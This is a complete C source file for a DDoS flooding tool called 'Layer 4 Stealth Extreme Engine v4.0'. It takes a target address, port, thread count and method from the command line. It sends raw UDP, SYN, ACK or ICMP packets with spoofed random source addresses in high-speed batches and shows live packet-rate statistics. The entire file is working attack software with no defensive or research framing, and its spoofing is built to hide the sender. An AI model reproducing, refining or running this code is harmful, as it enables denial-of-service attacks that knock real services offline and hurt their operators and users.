#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <signal.h>
#include <time.h>
#include <pthread.h>
#include <stdatomic.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>

volatile sig_atomic_t running = 1;
char target_ip[32];
int target_port;
int target_threads;
char method[32];
atomic_ullong total_packets;
atomic_ullong total_bytes;

uint64_t rng_state[4];

static inline uint64_t rotl(const uint64_t x, int k) {
    return (x << k) | (x >> (64 - k));
}

static inline uint64_t xoshiro256starstar(void) {
    const uint64_t result = rotl(rng_state[1] * 5, 7) * 9;
    const uint64_t t = rng_state[1] << 17;
    rng_state[2] ^= rng_state[0];
    rng_state[3] ^= rng_state[1];
    rng_state[1] ^= rng_state[2];
    rng_state[0] ^= rng_state[3];
    rng_state[2] ^= t;
    rng_state[3] = rotl(rng_state[3], 45);
    return result;
}

void seed_rng() {
    FILE *f = fopen("/dev/urandom", "rb");
    if (f) {
        if (fread(rng_state, sizeof(rng_state), 1, f) != 1) {
            rng_state[0] = time(NULL); rng_state[1] = clock(); 
            rng_state[2] = getpid(); rng_state[3] = getppid();
        }
        fclose(f);
    } else {
        rng_state[0] = time(NULL); rng_state[1] = clock(); 
        rng_state[2] = getpid(); rng_state[3] = getppid();
    }
}

static inline uint32_t fast_rand() {
    return (uint32_t)xoshiro256starstar();
}

static inline uint32_t get_random_ip() {
    return htonl((fast_rand() % 254 + 1) | ((fast_rand() & 0xFF) << 8) | ((fast_rand() & 0xFF) << 16) | ((fast_rand() % 254 + 1) << 24));
}

#define PRINTING_LINE_1 "\033[1;34m=============================================================\033[0m\n"

struct pseudo_header {
    uint32_t source_address;
    uint32_t destination_address;
    uint8_t placeholder;
    uint8_t protocol;
    uint16_t tcp_length;
} __attribute__((packed));

static inline unsigned short csum_fast(unsigned short *ptr, int nbytes) {
    register long sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) sum += *(unsigned char*)ptr;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void handle_signal(int sig) {
    running = 0;
}

void *stats_thread(void *arg) {
    unsigned long long last_pkts = 0, last_bytes = 0;
    while (running) {
        sleep(1);
        unsigned long long current_pkts = atomic_load(&total_packets);
        unsigned long long current_bytes = atomic_load(&total_bytes);
        unsigned long long pps = current_pkts - last_pkts;
        unsigned long long bps = current_bytes - last_bytes;
        last_pkts = current_pkts;
        last_bytes = current_bytes;
        
        printf("\r\033[K");
        printf("%s", PRINTING_LINE_1);
        printf("[ Layer 4 Stealth Extreme Engine v4.0 ]\n");
        printf("%s", PRINTING_LINE_1);
        printf("Target:      %s:%d\n", target_ip, target_port);
        printf("Method:      %s\n", method);
        printf("Threads:     %d\n", target_threads);
        printf("%s", PRINTING_LINE_1);
        printf("Total Packets: %llu\n", current_pkts);
        printf("Total Bytes:   %llu MB\n", current_bytes / (1024 * 1024));
        printf("%s", PRINTING_LINE_1);
        printf("Speed:         %llu pps / %llu Mbps\n", pps, (bps * 8) / (1024 * 1024));
        printf("%s", PRINTING_LINE_1);
        printf("Status:        [ STEALTH ENGAGING... ]\n");
        printf("%s", PRINTING_LINE_1);
        fflush(stdout);
    }
    return NULL;
}

#define BATCH_SIZE 256
#define MAX_PAYLOAD 1472

void *udp_max_flood(void *arg) {
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (s < 0) return NULL;
    int one = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    setsockopt(s, SOL_SOCKET, SO_REUSEPORT, &one, sizeof(one));

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(target_port);
    sin.sin_addr.s_addr = inet_addr(target_ip);

    char datagrams[BATCH_SIZE][2048] __attribute__((aligned(16)));
    struct sockaddr_in sins[BATCH_SIZE];
    struct mmsghdr msgs[BATCH_SIZE];
    struct iovec iovecs[BATCH_SIZE];

    for (int i = 0; i < BATCH_SIZE; i++) {
        memset(datagrams[i], 0, sizeof(datagrams[i]));
        struct iphdr *iph = (struct iphdr *)datagrams[i];
        struct udphdr *udph = (struct udphdr *)(datagrams[i] + sizeof(struct iphdr));
        char *payload = datagrams[i] + sizeof(struct iphdr) + sizeof(struct udphdr);
        
        for(int j = 0; j < MAX_PAYLOAD; j++) payload[j] = (char)(fast_rand() & 0xFF);

        iph->ihl = 5;
        iph->version = 4;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + MAX_PAYLOAD;
        iph->protocol = IPPROTO_UDP;
        iph->daddr = sin.sin_addr.s_addr;

        udph->dest = htons(target_port);
        udph->len = htons(sizeof(struct udphdr) + MAX_PAYLOAD);
        udph->check = 0;

        sins[i] = sin;
        iovecs[i].iov_base = datagrams[i];
        iovecs[i].iov_len = iph->tot_len;
        
        memset(&msgs[i], 0, sizeof(msgs[i]));
        msgs[i].msg_hdr.msg_name = &sins[i];
        msgs[i].msg_hdr.msg_namelen = sizeof(sin);
        msgs[i].msg_hdr.msg_iov = &iovecs[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
    }

    while (running) {
        for (int i = 0; i < BATCH_SIZE; i++) {
            struct iphdr *iph = (struct iphdr *)datagrams[i];
            struct udphdr *udph = (struct udphdr *)(datagrams[i] + sizeof(struct iphdr));
            
            iph->saddr = get_random_ip();
            iph->id = htons(fast_rand() & 0xFFFF);
            iph->ttl = (fast_rand() % 64) + 64;
            iph->tos = fast_rand() & 0xFF;
            iph->frag_off = htons(0x2000);
            iph->check = 0;
            iph->check = csum_fast((unsigned short *)iph, sizeof(struct iphdr));
            
            udph->source = htons(fast_rand() % 64512 + 1024);
        }
        
        sendmmsg(s, msgs, BATCH_SIZE, MSG_DONTWAIT);
        atomic_fetch_add(&total_packets, BATCH_SIZE);
        atomic_fetch_add(&total_bytes, BATCH_SIZE * (sizeof(struct iphdr) + sizeof(struct udphdr) + MAX_PAYLOAD));
    }
    close(s);
    return NULL;
}

void *syn_flood_opt(void *arg) {
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (s < 0) return NULL;
    int one = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(target_port);
    sin.sin_addr.s_addr = inet_addr(target_ip);

    char datagrams[BATCH_SIZE][128] __attribute__((aligned(16)));
    struct sockaddr_in sins[BATCH_SIZE];
    struct mmsghdr msgs[BATCH_SIZE];
    struct iovec iovecs[BATCH_SIZE];

    for (int i = 0; i < BATCH_SIZE; i++) {
        memset(datagrams[i], 0, sizeof(datagrams[i]));
        struct iphdr *iph = (struct iphdr *)datagrams[i];
        struct tcphdr *tcph = (struct tcphdr *)(datagrams[i] + sizeof(struct iphdr));

        iph->ihl = 5;
        iph->version = 4;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
        iph->protocol = IPPROTO_TCP;
        iph->daddr = sin.sin_addr.s_addr;

        tcph->dest = htons(target_port);
        tcph->doff = 5;
        tcph->syn = 1;
        tcph->window = htons(64240);

        sins[i] = sin;
        iovecs[i].iov_base = datagrams[i];
        iovecs[i].iov_len = iph->tot_len;
        
        memset(&msgs[i], 0, sizeof(msgs[i]));
        msgs[i].msg_hdr.msg_name = &sins[i];
        msgs[i].msg_hdr.msg_namelen = sizeof(sin);
        msgs[i].msg_hdr.msg_iov = &iovecs[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
    }

    struct pseudo_header psh;
    psh.destination_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr));

    while (running) {
        for (int i = 0; i < BATCH_SIZE; i++) {
            struct iphdr *iph = (struct iphdr *)datagrams[i];
            struct tcphdr *tcph = (struct tcphdr *)(datagrams[i] + sizeof(struct iphdr));
            
            iph->saddr = get_random_ip();
            iph->id = htons(fast_rand() & 0xFFFF);
            iph->ttl = (fast_rand() % 64) + 64;
            iph->tos = fast_rand() & 0xFF;
            iph->frag_off = htons(0x2000);
            iph->check = 0;
            iph->check = csum_fast((unsigned short *)iph, sizeof(struct iphdr));

            tcph->source = htons(fast_rand() % 64512 + 1024);
            tcph->seq = htonl(fast_rand());
            tcph->check = 0;
            
            psh.source_address = iph->saddr;
            
            char pseudogram[1024] __attribute__((aligned(16)));
            memcpy(pseudogram, &psh, sizeof(psh));
            memcpy(pseudogram + sizeof(psh), tcph, sizeof(struct tcphdr));
            tcph->check = csum_fast((unsigned short *)pseudogram, sizeof(psh) + sizeof(struct tcphdr));
        }
        
        sendmmsg(s, msgs, BATCH_SIZE, MSG_DONTWAIT);
        atomic_fetch_add(&total_packets, BATCH_SIZE);
    }
    close(s);
    return NULL;
}

void *ack_flood_opt(void *arg) {
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (s < 0) return NULL;
    int one = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(target_port);
    sin.sin_addr.s_addr = inet_addr(target_ip);

    char datagrams[BATCH_SIZE][128] __attribute__((aligned(16)));
    struct sockaddr_in sins[BATCH_SIZE];
    struct mmsghdr msgs[BATCH_SIZE];
    struct iovec iovecs[BATCH_SIZE];

    for (int i = 0; i < BATCH_SIZE; i++) {
        memset(datagrams[i], 0, sizeof(datagrams[i]));
        struct iphdr *iph = (struct iphdr *)datagrams[i];
        struct tcphdr *tcph = (struct tcphdr *)(datagrams[i] + sizeof(struct iphdr));

        iph->ihl = 5;
        iph->version = 4;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
        iph->protocol = IPPROTO_TCP;
        iph->daddr = sin.sin_addr.s_addr;

        tcph->dest = htons(target_port);
        tcph->doff = 5;
        tcph->ack = 1;
        tcph->window = htons(64240);

        sins[i] = sin;
        iovecs[i].iov_base = datagrams[i];
        iovecs[i].iov_len = iph->tot_len;
        
        memset(&msgs[i], 0, sizeof(msgs[i]));
        msgs[i].msg_hdr.msg_name = &sins[i];
        msgs[i].msg_hdr.msg_namelen = sizeof(sin);
        msgs[i].msg_hdr.msg_iov = &iovecs[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
    }

    struct pseudo_header psh;
    psh.destination_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr));

    while (running) {
        for (int i = 0; i < BATCH_SIZE; i++) {
            struct iphdr *iph = (struct iphdr *)datagrams[i];
            struct tcphdr *tcph = (struct tcphdr *)(datagrams[i] + sizeof(struct iphdr));
            
            iph->saddr = get_random_ip();
            iph->id = htons(fast_rand() & 0xFFFF);
            iph->ttl = (fast_rand() % 64) + 64;
            iph->tos = fast_rand() & 0xFF;
            iph->frag_off = htons(0x2000);
            iph->check = 0;
            iph->check = csum_fast((unsigned short *)iph, sizeof(struct iphdr));

            tcph->source = htons(fast_rand() % 64512 + 1024);
            tcph->seq = htonl(fast_rand());
            tcph->ack_seq = htonl(fast_rand());
            tcph->check = 0;
            
            psh.source_address = iph->saddr;
            
            char pseudogram[1024] __attribute__((aligned(16)));
            memcpy(pseudogram, &psh, sizeof(psh));
            memcpy(pseudogram + sizeof(psh), tcph, sizeof(struct tcphdr));
            tcph->check = csum_fast((unsigned short *)pseudogram, sizeof(psh) + sizeof(struct tcphdr));
        }
        
        sendmmsg(s, msgs, BATCH_SIZE, MSG_DONTWAIT);
        atomic_fetch_add(&total_packets, BATCH_SIZE);
    }
    close(s);
    return NULL;
}

void *icmp_flood_opt(void *arg) {
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (s < 0) return NULL;
    int one = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = 0;
    sin.sin_addr.s_addr = inet_addr(target_ip);

    char datagrams[BATCH_SIZE][2048] __attribute__((aligned(16)));
    struct sockaddr_in sins[BATCH_SIZE];
    struct mmsghdr msgs[BATCH_SIZE];
    struct iovec iovecs[BATCH_SIZE];

    for (int i = 0; i < BATCH_SIZE; i++) {
        int payload_len = MAX_PAYLOAD;
        memset(datagrams[i], 0, sizeof(datagrams[i]));
        struct iphdr *iph = (struct iphdr *)datagrams[i];
        struct icmphdr *icph = (struct icmphdr *)(datagrams[i] + sizeof(struct iphdr));
        char *payload = datagrams[i] + sizeof(struct iphdr) + sizeof(struct icmphdr);

        for(int j=0; j<payload_len; j++) payload[j] = (char)(fast_rand() & 0xFF);

        iph->ihl = 5;
        iph->version = 4;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct icmphdr) + payload_len;
        iph->protocol = IPPROTO_ICMP;
        iph->daddr = sin.sin_addr.s_addr;

        icph->type = ICMP_ECHO;
        icph->code = 0;
        icph->un.echo.id = htons(fast_rand() & 0xFFFF);
        icph->un.echo.sequence = htons(fast_rand() & 0xFFFF);
        icph->checksum = 0;
        icph->checksum = csum_fast((unsigned short *)icph, sizeof(struct icmphdr) + payload_len);

        sins[i] = sin;
        iovecs[i].iov_base = datagrams[i];
        iovecs[i].iov_len = iph->tot_len;
        
        memset(&msgs[i], 0, sizeof(msgs[i]));
        msgs[i].msg_hdr.msg_name = &sins[i];
        msgs[i].msg_hdr.msg_namelen = sizeof(sin);
        msgs[i].msg_hdr.msg_iov = &iovecs[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
    }

    while (running) {
        for (int i = 0; i < BATCH_SIZE; i++) {
            struct iphdr *iph = (struct iphdr *)datagrams[i];
            iph->saddr = get_random_ip();
            iph->id = htons(fast_rand() & 0xFFFF);
            iph->ttl = (fast_rand() % 64) + 64;
            iph->tos = fast_rand() & 0xFF;
            iph->frag_off = htons(0x2000);
            iph->check = 0;
            iph->check = csum_fast((unsigned short *)iph, sizeof(struct iphdr));
        }
        
        sendmmsg(s, msgs, BATCH_SIZE, MSG_DONTWAIT);
        atomic_fetch_add(&total_packets, BATCH_SIZE);
        atomic_fetch_add(&total_bytes, BATCH_SIZE * (sizeof(struct iphdr) + sizeof(struct icmphdr) + MAX_PAYLOAD));
    }
    close(s);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 5) {
        printf("Usage: %s <target_ip> <port> <threads> <method>\n", argv[0]);
        printf("Methods: udp_max | syn | ack | icmp\n");
        exit(EXIT_FAILURE);
    }
    
    strncpy(target_ip, argv[1], sizeof(target_ip) - 1);
    target_port = atoi(argv[2]);
    target_threads = atoi(argv[3]);
    strncpy(method, argv[4], sizeof(method) - 1);
    
    atomic_store(&total_packets, 0);
    atomic_store(&total_bytes, 0);
    seed_rng();
    signal(SIGINT, handle_signal);
    
    pthread_t *th = (pthread_t *)malloc(target_threads * sizeof(pthread_t));
    pthread_t stats_th;
    void *(*func)(void *) = NULL;
    
    if (strcmp(method, "udp_max") == 0) func = udp_max_flood;
    else if (strcmp(method, "syn") == 0) func = syn_flood_opt;
    else if (strcmp(method, "ack") == 0) func = ack_flood_opt;
    else if (strcmp(method, "icmp") == 0) func = icmp_flood_opt;
    else {
        printf("Unknown method: %s\n", method);
        free(th);
        exit(EXIT_FAILURE);
    }
    
    printf("\033[2J\033[H");
    pthread_create(&stats_th, NULL, stats_thread, NULL);
    
    for (int i = 0; i < target_threads; i++) {
        if (pthread_create(&th[i], NULL, func, NULL) != 0) {
            perror("Failed to create thread");
        }
    }
    
    while (running) {
        sleep(1);
    }
    
    printf("\n[!] Stopping attack...\n");
    
    for (int i = 0; i < target_threads; i++) {
        pthread_cancel(th[i]);
        pthread_join(th[i], NULL);
    }
    pthread_cancel(stats_th);
    pthread_join(stats_th, NULL);
    
    free(th);
    return 0;
}
